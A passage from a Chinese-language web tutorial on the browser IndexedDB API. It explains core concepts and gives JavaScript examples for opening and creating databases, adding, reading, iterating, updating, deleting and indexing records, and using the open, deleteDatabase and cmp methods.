<h3 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h3><p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>
<ul>
<li>数据库：IDBDatabase 对象</li>
<li>对象仓库：IDBObjectStore 对象</li>
<li>索引： IDBIndex 对象</li>
<li>事务： IDBTransaction 对象</li>
<li>操作请求：IDBRequest 对象</li>
<li>指针： IDBCursor 对象</li>
<li>主键集合：IDBKeyRange 对象</li>
</ul>
<p>下面是一些主要的概念。</p>
<p><strong>（1）数据库</strong></p>
<p>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。</p>
<p>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>
<p><strong>（2）对象仓库</strong></p>
<p>每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。</p>
<p><strong>（3）数据记录</strong></p>
<p>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">text</span>: <span class="string">&#x27;foo&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>上面的对象中，<code>id</code>属性可以当作主键。</p>
<p>数据体可以是任意数据类型，不限于对象。</p>
<p><strong>（4）索引</strong></p>
<p>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>
<p><strong>（5）事务</strong></p>
<p>数据记录的读写和删改，都要通过事务完成。事务对象提供<code>error</code>、<code>abort</code>和<code>complete</code>三个事件，用来监听操作结果。</p>
<h3 id="3、操作流程"><a href="#3、操作流程" class="headerlink" title="3、操作流程"></a>3、操作流程</h3><p>IndexedDB 数据库的各种操作，一般是按照下面的流程进行的。这个部分只给出简单的代码示例，用于快速上手，详细的各个对象的 API 放在后文介绍。</p>
<h4 id="3-1-打开数据库"><a href="#3-1-打开数据库" class="headerlink" title="3.1 打开数据库"></a>3.1 打开数据库</h4><p>使用 IndexedDB 的第一步是打开数据库，使用<code>indexedDB.open()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">open</span>(databaseName, version);</span><br></pre></td></tr></table></figure>

<p>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为<code>1</code>。</p>
<p><code>indexedDB.open()</code>方法返回一个 IDBRequest 对象。这个对象通过三种事件<code>error</code>、<code>success</code>、<code>upgradeneeded</code>，处理打开数据库的操作结果。</p>
<p><strong>（1）error 事件</strong></p>
<p><code>error</code>事件表示打开数据库失败。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据库打开报错&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>（2）success 事件</strong></p>
<p><code>success</code>事件表示成功打开数据库。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"></span><br><span class="line">request.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  db = request.<span class="property">result</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据库打开成功&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这时，通过<code>request</code>对象的<code>result</code>属性拿到数据库对象。</p>
<p><strong>（3）upgradeneeded 事件</strong></p>
<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件<code>upgradeneeded</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"></span><br><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  db = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时通过事件对象的<code>target.result</code>属性，拿到数据库实例。</p>
<h4 id="3-2-新建数据库"><a href="#3-2-新建数据库" class="headerlink" title="3.2 新建数据库"></a>3.2 新建数据库</h4><p>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在<code>upgradeneeded</code>事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>
<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  db = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">var</span> objectStore = db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;person&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;id&#x27;</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，数据库新建成功以后，新增一张叫做<code>person</code>的表格，主键是<code>id</code>。</p>
<p>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  db = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">var</span> objectStore;</span><br><span class="line">  <span class="keyword">if</span> (!db.<span class="property">objectStoreNames</span>.<span class="title function_">contains</span>(<span class="string">&#x27;person&#x27;</span>)) &#123;</span><br><span class="line">    objectStore = db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;person&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;id&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主键（key）是默认建立索引的属性。比如，数据记录是<code>&#123; id: 1, name: &#39;张三&#39; &#125;</code>，那么<code>id</code>属性可以作为主键。主键也可以指定为下一层对象的属性，比如<code>&#123; foo: &#123; bar: &#39;baz&#39; &#125; &#125;</code>的<code>foo.bar</code>也可以指定为主键。</p>
<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectStore = db.<span class="title function_">createObjectStore</span>(</span><br><span class="line">  <span class="string">&#x27;person&#x27;</span>,</span><br><span class="line">  &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，指定主键为一个递增的整数。</p>
<p>新建对象仓库以后，下一步可以新建索引。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  db = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">var</span> objectStore = db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;person&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;id&#x27;</span> &#125;);</span><br><span class="line">  objectStore.<span class="title function_">createIndex</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">  objectStore.<span class="title function_">createIndex</span>(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>IDBObject.createIndex()</code>的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>
<h4 id="3-3-新增数据"><a href="#3-3-新增数据" class="headerlink" title="3.3 新增数据"></a>3.3 新增数据</h4><p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> request = db.<span class="title function_">transaction</span>([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">    .<span class="title function_">objectStore</span>(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    .<span class="title function_">add</span>(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span>, <span class="attr">email</span>: <span class="string">&#x27;zhangsan@example.com&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  request.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据写入成功&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据写入失败&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过<code>IDBTransaction.objectStore(name)</code>方法，拿到 IDBObjectStore 对象，再通过表格对象的<code>add()</code>方法，向表格写入一条记录。</p>
<p>写入操作是一个异步操作，通过监听连接对象的<code>success</code>事件和<code>error</code>事件，了解是否写入成功。</p>
<h4 id="3-4-读取数据"><a href="#3-4-读取数据" class="headerlink" title="3.4 读取数据"></a>3.4 读取数据</h4><p>读取数据也是通过事务完成。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> transaction = db.<span class="title function_">transaction</span>([<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">   <span class="keyword">var</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line">   <span class="keyword">var</span> request = objectStore.<span class="title function_">get</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   request.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;事务失败&#x27;</span>);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   request.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params"> event</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.<span class="property">result</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Name: &#x27;</span> + request.<span class="property">result</span>.<span class="property">name</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Age: &#x27;</span> + request.<span class="property">result</span>.<span class="property">age</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Email: &#x27;</span> + request.<span class="property">result</span>.<span class="property">email</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未获得数据记录&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">read</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>objectStore.get()</code>方法用于读取数据，参数是主键的值。</p>
<h4 id="3-5-遍历数据"><a href="#3-5-遍历数据" class="headerlink" title="3.5 遍历数据"></a>3.5 遍历数据</h4><p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> objectStore = db.<span class="title function_">transaction</span>(<span class="string">&#x27;person&#x27;</span>).<span class="title function_">objectStore</span>(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   objectStore.<span class="title function_">openCursor</span>().<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">     <span class="keyword">var</span> cursor = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Id: &#x27;</span> + cursor.<span class="property">key</span>);</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Name: &#x27;</span> + cursor.<span class="property">value</span>.<span class="property">name</span>);</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Age: &#x27;</span> + cursor.<span class="property">value</span>.<span class="property">age</span>);</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Email: &#x27;</span> + cursor.<span class="property">value</span>.<span class="property">email</span>);</span><br><span class="line">       cursor.<span class="title function_">continue</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有更多数据了！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">readAll</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，新建指针对象的<code>openCursor()</code>方法是一个异步操作，所以要监听<code>success</code>事件。</p>
<h4 id="3-6-更新数据"><a href="#3-6-更新数据" class="headerlink" title="3.6 更新数据"></a>3.6 更新数据</h4><p>更新数据要使用<code>IDBObject.put()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> request = db.<span class="title function_">transaction</span>([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">    .<span class="title function_">objectStore</span>(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    .<span class="title function_">put</span>(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">35</span>, <span class="attr">email</span>: <span class="string">&#x27;lisi@example.com&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  request.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据更新成功&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据更新失败&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">update</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>put()</code>方法自动更新了主键为<code>1</code>的记录。</p>
<h4 id="3-7-删除数据"><a href="#3-7-删除数据" class="headerlink" title="3.7 删除数据"></a>3.7 删除数据</h4><p><code>IDBObjectStore.delete()</code>方法用于删除记录。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> request = db.<span class="title function_">transaction</span>([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">    .<span class="title function_">objectStore</span>(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    .<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  request.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数据删除成功&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">remove</span>();</span><br></pre></td></tr></table></figure>



<h4 id="3-8-使用索引"><a href="#3-8-使用索引" class="headerlink" title="3.8 使用索引"></a>3.8 使用索引</h4><p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>
<p>假定新建表格的时候，对<code>name</code>字段建立了索引。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">createIndex</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>现在，就可以从<code>name</code>找到对应的数据记录了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> transaction = db.<span class="title function_">transaction</span>([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = transaction.<span class="title function_">objectStore</span>(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = store.<span class="title function_">index</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = index.<span class="title function_">get</span>(<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"></span><br><span class="line">request.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> result = e.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">if</span> (result) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4、indexedDB-对象"><a href="#4、indexedDB-对象" class="headerlink" title="4、indexedDB 对象"></a>4、indexedDB 对象</h3><p>浏览器原生提供<code>indexedDB</code>对象，作为开发者的操作接口。</p>
<h4 id="4-1-indexedDB-open"><a href="#4-1-indexedDB-open" class="headerlink" title="4.1 indexedDB.open()"></a>4.1 indexedDB.open()</h4><p><code>indexedDB.open()</code>方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> openRequest = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码表示，打开一个名为<code>test</code>、版本为<code>1</code>的数据库。如果该数据库不存在，则会新建该数据库。</p>
<p><code>open()</code>方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于<code>0</code>的正整数（<code>0</code>将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为<code>1</code>。</p>
<p>打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。</p>
<ul>
<li><strong>success</strong>：打开成功。</li>
<li><strong>error</strong>：打开失败。</li>
<li><strong>upgradeneeded</strong>：第一次打开该数据库，或者数据库版本发生变化。</li>
<li><strong>blocked</strong>：上一次的数据库连接还未关闭。</li>
</ul>
<p>第一次打开数据库时，会先触发<code>upgradeneeded</code>事件，然后触发<code>success</code>事件。</p>
<p>根据不同的需要，对上面4种事件监听函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> openRequest = indexedDB.<span class="title function_">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"></span><br><span class="line">openRequest.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Upgrading...&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">  db = openRequest.<span class="property">result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码有两个地方需要注意。首先，<code>open()</code>方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，<code>success</code>事件发生后，从<code>openRequest.result</code>属性可以拿到已经打开的<code>IndexedDB</code>数据库对象。</p>
<h4 id="4-2-indexedDB-deleteDatabase"><a href="#4-2-indexedDB-deleteDatabase" class="headerlink" title="4.2 indexedDB.deleteDatabase()"></a>4.2 indexedDB.deleteDatabase()</h4><p><code>indexedDB.deleteDatabase()</code>方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个<code>IDBOpenDBRequest</code>对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，<code>IDBOpenDBRequest</code>对象可以监听以下事件。</p>
<ul>
<li><code>success</code>：删除成功</li>
<li><code>error</code>：删除报错</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">DBDeleteRequest</span> = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">deleteDatabase</span>(<span class="string">&#x27;demo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">DBDeleteRequest</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DBDeleteRequest</span>.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>调用<code>deleteDatabase()</code>方法以后，当前数据库的其他已经打开的连接都会接收到<code>versionchange</code>事件。</p>
<p>注意，删除不存在的数据库并不会报错。</p>
<h4 id="4-3-indexedDB-cmp"><a href="#4-3-indexedDB-cmp" class="headerlink" title="4.3 indexedDB.cmp()"></a>4.3 indexedDB.cmp()</h4><p><code>indexedDB.cmp()</code>方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：<code>0</code>表示相同，<code>1</code>表示第一个主键大于第二个主键，<code>-1</code>表示第一个主键小于第二个主键。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">cmp</span>(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>

<p>注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">cmp</span>(<span class="number">1</span>, <span class="literal">true</span>) <span class="comment">// 报错</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">cmp</span>(&#123;&#125;, &#123;&#125;) <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>



